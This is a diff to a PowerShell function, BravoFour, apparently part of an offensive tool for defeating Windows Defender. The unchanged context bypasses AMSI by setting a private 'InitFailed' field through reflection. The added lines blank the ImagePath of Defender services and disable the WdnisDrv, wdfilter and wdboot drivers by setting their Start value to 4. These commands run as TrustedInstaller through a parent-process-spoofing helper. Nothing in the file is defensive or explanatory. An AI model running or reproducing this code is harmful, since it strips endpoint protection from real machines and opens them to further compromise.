@@ -12,7 +12,7 @@ function BravoFour {
     $d=$c.GetFields('NonPublic,Static')
     Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
     $g=$f.SetValue($null,$true)
-    
+     
     # Disabling defender services and drivers
     $spawnPPID = @"
     using System;
@@ -179,6 +179,7 @@ function BravoFour {
     
     $powershellPath = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
     
+    
     # Disabling defender services
     Write-Host "[+] Disable services" -ForegroundColor Green
     Write-Host
@@ -186,8 +187,20 @@ function BravoFour {
     foreach ($svc in $svc_list) {
         if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$svc")) {
             Write-Host "[i] Disabling $svc" -ForegroundColor DarkRed
-            $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$svc"" -Name Start -Value '4'"
+            $powershellArg = "-c Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$svc"" -Name ImagePath -Value ''"
             [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
         }
-    }  
+    }
+    
+    # Disabling defender drivers
+    Write-Host "[+] Disable drivers" -ForegroundColor Green
+    Write-Host
+    $drv_list = @("WdnisDrv", "wdfilter", "wdboot")
+    foreach ($drv in $drv_list) {
+        if ($(Test-Path "HKLM:\SYSTEM\CurrentControlSet\Services\$drv")) {
+            Write-Host "[i] Disabling $drv" -ForegroundColor DarkRed
+            $powershellArg = "Set-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Services\$drv"" -Name Start -Value '4'"
+            [GetTrustedInstaller.spawnPPID]::Run($serviceProcessId, $powershellPath, $powershellArg)
+        }
+    }
 }
